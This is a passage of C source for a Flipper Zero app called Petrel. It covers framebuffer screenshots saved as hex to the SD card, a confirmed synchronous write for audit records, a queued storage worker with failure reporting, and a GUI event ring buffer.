// 19 KB olduğu için ekran görüntüsü OOM çökmesine yol açıyordu (C1-C6). Gui'nin framebuffer commit
// callback'i cihazın çizdiği kareyi doğrudan verir: heap maliyeti yok. Kare 64 karakterlik hex
// satırları olarak SD'ye yazılır (CLI binary okuyamaz); tools/flip_shot.py PNG'ye çevirir.
#define SHOT_HEX_PATH "/ext/petrel/shot.hex"
#define SHOT_BYTES    1024u   // 128x64, 1 bit/piksel, SSD1306 page layout

static void petrel_fb_callback(
    uint8_t* data,
    size_t size,
    CanvasOrientation orientation,
    void* context) {
    UNUSED(orientation);
    Petrel* app = context;
    if(!app || size < SHOT_BYTES) return;
    uint32_t now = furi_get_tick();
    if(now - app->shot_tick < furi_ms_to_ticks(400)) return;   // en fazla ~2.5 kare/sn
    // Ayni kareyi tekrar yazma: SD'ye yalnizca ekran gercekten degistiginde dokunulur. 1 KB'lik
    // karsilastirma buffer'i yerine 32-bit FNV izi tutulur (bellek maliyeti yok).
    uint32_t sum = 2166136261u;
    for(size_t i = 0; i < SHOT_BYTES; i++) sum = (sum ^ data[i]) * 16777619u;
    if(sum == app->shot_last_sum) return;
    app->shot_last_sum = sum;
    app->shot_tick = now;
    char* hex = malloc(2048u + 40u);                           // 2048 hex + satir sonlari
    if(!hex) return;                                           // yer yoksa sessizce atla
    static const char* H = "0123456789abcdef";
    size_t o = 0;
    for(size_t i = 0; i < SHOT_BYTES; i++) {
        if(i && (i % 32u) == 0) hex[o++] = '\n';
        hex[o++] = H[data[i] >> 4];
        hex[o++] = H[data[i] & 0x0f];
    }
    hex[o++] = '\n';
    if(!storage_submit(SHOT_HEX_PATH, hex, o, false)) free(hex);
}

// Synchronous, CONFIRMED write for audit evidence. The audit record must be able to state whether
// the capture actually reached the card (captured != saved - a slow/failed SD must not read as a
// completed, saved audit). This runs on the UART worker thread, not the GUI thread, so a blocking
// SD write here does not stall the UI. Non-audit writers keep using the async storage_submit queue.
static bool storage_write_now(const char* path, const char* data, size_t len, bool append) {
    if(!data) return false;
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* fh = storage_file_alloc(st);
    FS_OpenMode om = append ? FSOM_OPEN_APPEND : FSOM_CREATE_ALWAYS;
    bool ok = false;
    if(storage_file_open(fh, path, FSAM_WRITE, om)) {
        size_t w = storage_file_write(fh, data, len);
        ok = (w == len);
        if(ok) {
            STORAGE_STATUS("saved %.12s", strrchr(path, '/') ? strrchr(path, '/') + 1 : path);
        } else {
            STORAGE_STATUS("SD full? %u/%u bytes", (unsigned)w, (unsigned)len);
            storage_fail_seq++;
        }
        storage_file_close(fh);
    } else {
        STORAGE_STATUS("no SD / open failed");
        storage_fail_seq++;
    }
    storage_file_free(fh);
    furi_record_close(RECORD_STORAGE);
    return ok;
}

static int32_t storage_worker(void* context) {
    UNUSED(context);
    while(storage_run) {
        StorageJob job = {0};
        bool have = false;
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        if(storage_tail != storage_head) {
            job = storage_q[storage_tail];
            storage_tail = (uint8_t)((storage_tail + 1) % STORAGE_Q);
            have = true;
        }
        furi_mutex_release(storage_mutex);
        if(!have) {
            furi_delay_ms(20);
        }
        // Persist diagnostics: batched, synced, and never from the caller's thread. A crash+reboot
        // wipes the RAM log, so the last records must already be on the card.
        {
            static uint32_t last_diag = 0;
            uint32_t nowt = furi_get_tick();
            uint32_t pending = diag_head - diag_flushed;
            if(pending > 0 &&
               ((uint32_t)(nowt - last_diag) >= furi_ms_to_ticks(250) || pending >= 64)) {
                last_diag = nowt;
                diag_flush();
            }
        }
        if(!have) {
            continue;
        }
        diag(16, (uint32_t)job.len, 0);              // job dequeued for writing
        Storage* st = furi_record_open(RECORD_STORAGE);
        File* f = storage_file_alloc(st);
        FS_OpenMode om = job.append ? FSOM_OPEN_APPEND : FSOM_CREATE_ALWAYS;
        if(storage_file_open(f, job.path, FSAM_WRITE, om)) {
            size_t w = storage_file_write(f, job.data, job.len);
            if(w != job.len) {
                // Short write: the card may be full. Say so instead of pretending it saved.
                STORAGE_STATUS("SD full? %u/%u bytes", (unsigned)w, (unsigned)job.len);
                storage_fail_seq++;
                FURI_LOG_E(TAG, "storage short write %s %u/%u", job.path, (unsigned)w,
                           (unsigned)job.len);
            } else {
                STORAGE_STATUS("saved %.12s",
                               strrchr(job.path, '/') ? strrchr(job.path, '/') + 1 : job.path);
            }
            storage_file_close(f);
        } else {
            STORAGE_STATUS("no SD / open failed");
            storage_fail_seq++;
            FURI_LOG_E(TAG, "storage open failed %s", job.path);
        }
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        free(job.data);
    }
    return 0;
}

// GUI thread only (the tick). False when nothing is pending.
static bool take_event(uint32_t* ev) {
    if(!post_mutex) return false;
    bool ok = false;
    furi_mutex_acquire(post_mutex, FuriWaitForever);
    if(post_tail != post_head) {
        *ev = post_ring[post_tail];
        post_tail = (uint8_t)((post_tail + 1) % POST_RING);
        ok = true;
    }
    furi_mutex_release(post_mutex);
    return ok;
}

